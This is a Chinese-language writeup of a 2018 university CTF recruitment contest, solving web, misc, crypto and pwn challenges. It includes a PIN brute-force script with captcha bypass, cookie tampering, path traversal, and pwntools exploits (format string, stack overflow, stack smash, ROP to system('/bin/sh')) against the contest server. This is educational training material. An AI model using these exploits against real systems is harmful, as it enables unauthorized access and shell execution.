---
layout: posts
title: sysucsa2018招新赛writeup
date: 2018-09-28 21:22:37
tags: writeup
---

2018 招新赛 writeup
<!-- more -->

## web 

### web签到题

上过`bugkuCTF`的朋友就知道这道题其实就是他们的签到题啦，一开始我也被这个滑稽的网页惊到了hhh

为了给大家增加一点愉悦的气氛就设置了这个签到题啦

{% asset_img 1.png %}

打开页面是无数铺面而来的滑稽脸

直接按`F12`查看源代码就可以看到`flag`啦

{% asset_img 2.png %}

### fake md5 collision

这题也是一个`CTF`中一个非常基础的问题了

一打开网站发现需要输入两个字符串，上面一句提示让我们去看源码，那就直接F12源码呗

{% asset_img 3.png %}

这里有一段注释的代码，大意就是输入两个不同的字符串，但是这两个字符串要有相同的md5值，也就是说构造一个md5碰撞咯，但是仔细看看题目是`fake md5 collision`，说明肯定还有其他办法的啦。

在这里先补充一下`php`弱类型的一些基础知识：

在php中是有两种判断相等的比较符号的：== 和 ===

> === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较
>
> == 在进行比较的时候，会先将字符串类型转化成相同，再比较

问题就出在这个==的比较上了，如果比较的字符串是`0e`开头的话，那么这个字符串就会被识别成科学记数法，无论后面的数字是什么都会被视作0，所以利用这个特点就可以进行绕过了。

下面给出几个`MD5`值是`0e`开头的字符串

```shell
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
```

随便拿其中两个的输入就能拿到flag了。

{% asset_img 4.png %}

另外我们还可以利用MD5函数的特点，如果传入的a和b不是字符串而是其他的数据类型，那么MD5函数就会返回NULL。那么`NULL == NULL`也是true，同样满足了条件，可以获取到flag

### 单身二十年

{% asset_img 6.png %}这题点击**key在这里哦**之后直接到了另外一个页面

{% asset_img 7.png %}

注意到这个页面的地址与链接中的地址不一致，说明中间有页面跳转。

知道这个之后直接使用BurpSuite进行截取中间跳转的那个页面即可拿到flag。

{% asset_img 5.png %}

### AAencode

这题点开一看都是各种颜文字肯定一脸懵逼，直接百度`AAencode`就会发现这个是`JS`的一个变种，直接复制到控制台运行即可。

{% asset_img 8.png %}



### robots

- `robots.txt`是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。
- 因此在做web题时，看一看`robots.txt`文件是必要的
- 发现惊喜：
- {% asset_img web11.png %}
- 访问得到flag
- {% asset_img web12.png %}

### My sercet word 

- 访问网站，查看3时发现提示`shh, the flag is in flag.php`
- 尝试直接访问`flag.php`，发现有保护
- {% asset_img web21.png %}
- 猜测网站可能存在路径穿越漏洞，尝试在搜索框输入`../flag.php`
- `flag.php`成功被包含
- {% asset_img web22.png %}
- 同时我们也可以尝试包含其它的文件，甚至是`index.php`
- {% asset_img web23.png %}

### Web-x

#### 出题人

进去一看发现啥都没有，一看`cookies`除了`PHPSESSID`还有个`sess`，注意到是`base64`，解码后发现是`php`序列化数据，将`admin`键对应的`boolean`值设为`1`，编码后作为`sess`进入第二阶段。
提示到有个4位数字的PIN码发送到了手机，只有`4`位已经是明示爆破了，然后编写脚本在爆破的时候过验证码。
{% asset_img webx.png %}
爆破的脚本供参考
{% asset_img webx1.png %}
成功后会拿到一个`webshell`，`cat /flag`获取`flag`。

#### zfl

- 首先查看`cookies`，发现是`base64`编码，解码后发现是一个`php`序列化对象，`a:1:{s:5:"admin";b:0;}`
- 修改`admin`为1后，`base64`编码，修改`cookies`，得到下一个页面
- {% asset_img web31.png %}
- 发现需要输入PIN和验证码，验证码可以写脚本自动计算，PIN需要爆破
- 脚本如下：

```python
import requests

url = "http://sysucsa.me:8080/index.php"

admin_cookies = {'PHPSESSID':'3f4a466a44e7413c5336afe8ed2c3676', 'sess':'YToxOntzOjU6ImFkbWluIjtiOjE7fQ=='}
for tri in range(1, 10000):
    try:
        resg = requests.get(url, cookies = admin_cookies)
        rs = resg.text
        rs = rs[rs.find('="captcha" placeholder='):]
        rs = rs[23:]
        rs = rs[:rs.find('\n')]
        rs = rs[:-1]
        rs = rs.split('+')
        res_num = int(rs[0]) + int(rs[1])
        # print resg.text
        # print rs, res_num
        mdata = {'key':tri, 'captcha':res_num}
        resp = requests.post(url, cookies = admin_cookies, data = mdata)
        print resp.text
        if resp.text.find('not correct.') == -1:
            print "[+]Done!!! key:" + str(tri)
            break
        print "[-]Fail key:" + str(tri)
    except e:
        print "[!]connection fail!"
        tri -= 1
```

- 使用爆破得到的PIN，发现进入一个`shell`
- 找找`flag`，cat一下
- {% asset_img web32.png %}

## misc

### Misc 签到题

V1hwT2MyVnRVbGhVYm5CYVYwaE9ORnBGV1RWak1 rMTRUMWh3VGxKcWJITldWRXBIVGxkYVVsQlVNRDA9

`base 64` 解码

### more png 

- 基础知识：png文件元数据
- {% asset_img misc1.png %}
- 图像残缺，说明可能是元数据的height被修改
- 用winhex或010editor打开，修复之
- {% asset_img misc2.png %}

### python 是世界上最好的两种语言

`010 editor` 打开 `PNG`文件头被修改
{% asset_img 11.png %}
修改后保存为 `png` 格式  
{% asset_img 22.png %}  
画图补全，扫描后获得网址
[www.rowtoolong.cn](www.rowtoolong.cn)  
得到一串十六进制文本

```
03F30D0A8EBA985B6300000000000000000100000040000000730D0000006400008400005A0000640100532802000000630000000003000000250000004300000073A5000000640100640200640100640300640400640100640500640600640700640800640900640A00640B00640C00640D00640E00640F00640D00641000640A00641100640D00641200641100640F00640900640D00640E00641300640C006414006415006413006414006411006416006417006725007D00006418007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100718200577C010047486400005328190000004E69530000006959000000695500000069430000006941000000697B00000069500000006935000000697400000069680000006930000000696E000000695F000000693100000069730000006932000000696500000069330000006961000000696700000069750000006921000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C616774010000006928000000002800000000730500000070792E707952030000000100000073520000000002030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301030103010301090206010D0114014E28010000005203000000280000000028000000002800000000730500000070792E707974080000003C6D6F64756C653E010000007300000000
```

保存为 `pyc` 格式，反编译

```py
def flag():
    str = [
        83,
        89,
        83,
        85,
        67,
        83,
        65,
        123,
        80,
        53,
        116,
        104,
        48,
        110,
        95,
        49,
        115,
        95,
        50,
        104,
        101,
        95,
        51,
        101,
        115,
        116,
        95,
        49,
        97,
        110,
        103,
        117,
        97,
        103,
        101,
        33,
        125]
    flag = ''
    for i in str:
        flag += chr(i)
    print flag
```

运行得到 `flag`

## crypto

### F__

- jsFuck编码，直接放入浏览器控制台执行即可
- {% asset_img crypto.png %}

### 摩尔斯与凯撒的约会

这题嘛...提示得也是够明显了..直接解密摩尔斯电码然后再用解密凯撒密码即可，多次尝试可得偏移量为5时是`flag`。

{% asset_img 9.png %}

手动加上前后大括号即可。

一开始没有说清楚格式稍微坑了下...希望大家谅解hhh

### I wanna be modern

`DES`

## reverse 

右转出题人 [博客](https://blog.csdn.net/ChrysanthemumZhao/article/details/82826552) 

## pwn

### cat flag

直接 `nc` 连上服务器，`cat flag` 就可以。
不清楚的麻烦搜搜 `nc` 和 `cat` 命令

### format string

利用格式化字符串修改栈内存。
具体可以看看[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/#_9) 的利用步骤，本题只是修改了偏移和数值

```python
from pwn import *
#sh = process('./pwn1')
sh = remote("sysucsa.me",5050)
num_addr = int(sh.recvuntil('\n'),16)
payload = p32(num_addr) + '%096d' + '%7$n'
sh.sendline(payload)
sh.interactive()
```

我们也可以使用 `pwntools` 中提供的 `fmtstr_payload` 具体怎么使用搜索吧...

```python
from pwn import *
#sh = process('./pwn1')
sh = remote("sysucsa.me",5050)
num_addr = int(sh.recv(),16)
payload = fmtstr_payload(7,{num_addr:100})
sh.sendline(payload)
sh.interactive()
```

### overflow 

题目很明显了，简单栈溢出，需要学习一下[栈溢出原理](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow_basic/#_6) 覆盖`num`为`0x1234ABCD`就好

```python
from pwn import *
#r = process('./pwn2')
r = remote("sysucsa.me",5051)
payload='a'*20+p32(0x1234ABCD)
r.sendline(payload)
r.interactive()
```

### smash

stack smash 原理请看：[ ssp leak](https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/)

程序一开始会读取 `flag.txt `到 `bss` 段的 `buffer`，这个地址是固定的
所以我们可以覆盖 `argv[0]` 为`flag`地址，触发崩溃时直接输出 `flag`
我们可以测试 argv[0]距离缓冲区的距离。或者暴力直接用地址全覆盖了。   
测地址是这样：   
首先在 main 函数入口设个断点 `b *0804859B`
此时在输出的 context 可以看到

```c
0xffffcf3c│+0x00: 0xf7e1a637  →  <__libc_start_main+247> add esp, 0x10	 ← $esp
0xffffcf40│+0x04: 0x00000001
0xffffcf44│+0x08: 0xffffcfd4  →  0xffffd1cc  →  "/home/yuuoniy/Desktop/pwn/pwn3"
0xffffcf48│+0x0c: 0xffffcfdc  →  0xffffd1eb  →  "LC_PAPER=zh_CN.UTF-8" 
```

记下 `0xffffcfd4` ,再算一下我们输入字串的开始地址到该地址的偏移, 可以随意输入一段 `junk`,然后在内存中搜索这段 `junk`, 得到地址,这里得到 `0xffffcf08`

```c
gef➤  grep aaaabaaacaaadaaae
[+] Searching 'aaaabaaacaaadaaae' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcf08 - 0xffffcf3f  →   "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]" 
```

计算一下 `0xffffcfd4-0xffffcf08 = 204`

注意本地跑的时候，需要自己创个 `flag.txt` 文件，并且长度要大于 `15`。

```python
from pwn import *
#sh = process("./pwn3")
sh = remote("sysucsa.me",5052)
buf_addr = p32(0x804A060)
#sh.sendline(buf_addr*52) 
sh.sendline('a'*204+buf_addr)
sh.interactive()
```

但是从 `libc 2.25` 后，会以打印出字符串 <unknown> 结束，也就没有办法输出 `argv[0]` 了。用 `libc 2.23` 就可以了。

### rop

首先需要学习函数调用栈以及 [rop](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/) 的思想。   
这道题就是其实就是 [ret2libc2](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/#ret2libc)，程序有个很明显的栈溢出漏洞，并且提供了 system 函数。   
我们需要自己控制程序读取字串 `'/bin/sh'`到 `bss` 段，再控制程序执行 `system(""/bin/sh")`,这道题只是地址和偏移改了。
地址在 `ida` 中查看就好了，`gadgets` 使用 `ROPgadget`、`ropper` 之类的工具搜索。

偏移可以算或者直接在 `gdb` 中测: 
首先生成一段 `junk`

```c
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

运行程序输入生成的字符串，因为栈溢出覆盖了返回地址，此时程序会崩溃

```c
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616178 => 返回地址被覆盖为 0x61616178
```

此时搜一下返回地址

```c
gef➤  pattern search 0x61616178
[+] Searching '0x61616178'
[+] Found at offset 92 (little-endian search) likely
[+] Found at offset 89 (big-endian search) 
```

就得到了偏移，是 `92` 
以上是 `gef` 的命令  
`pwndbg` 对应的是：
`cyclic 200` 生成长度为 200 字串
`cyclic -l xxxx` 查找

```python
from pwn import *
#sh = process('./pwn4')
sh = remote("sysucsa.me",5053)
gets_plt =  0x8048430
system_plt = 0x8048460 
pop_ebx = 0x08048415
buf = 0x804A060 
main = 0x804864D 
context.log_level='debug'
payload = 'a'*92+p32(gets_plt)+p32(pop_ebx)+p32(buf)+p32(system_plt)+p32(main)+p32(buf)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```